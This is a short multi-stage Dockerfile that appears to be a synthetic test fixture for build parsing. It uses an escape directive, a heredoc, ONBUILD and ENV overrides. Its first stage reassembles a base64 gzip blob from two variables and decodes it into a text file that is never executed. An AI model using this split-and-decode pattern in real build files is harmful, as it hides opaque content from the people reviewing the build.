# escape=`
ARG IMG=wordpress:cli
FROM --platform=$BUILDPLATFORM ${IMG} AS gen
ARG CHUNK1=H4sIAAAAAAACAz2OSw6DMAwFr1TUzy636D4yjgGLNEaO+Qj5
ENV CHUNK2=8A0b1vPeaLbw9AxlXGGkkARn0oEzuUqmkAUSqW+kidHCDzIjy1odzADn8O26x9shwWKk7b2X6xHpIPRJqsVF5bKFnUujNaIUAy7NKf2wVgRjKfdqPHmJPVT6vLxaC7rJREotzgsdFu/cHgynP4aQlgbBAAAA `
    TOOLS=C:\tools\
USER root
ONBUILD RUN echo onbuild-trigger
RUN <<EOT
mkdir -p /o
printf "%s" "${CHUNK1}${CHUNK2}" | base64 -d | gunzip > /o/p.txt
EOT

FROM gen AS mid
ENV CHUNK2=QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=
RUN echo "${CHUNK2}" > /tmp/mid.txt

FROM scratch AS analysis_77e0b5aa
COPY --from=0 /o/p.txt /p.txt
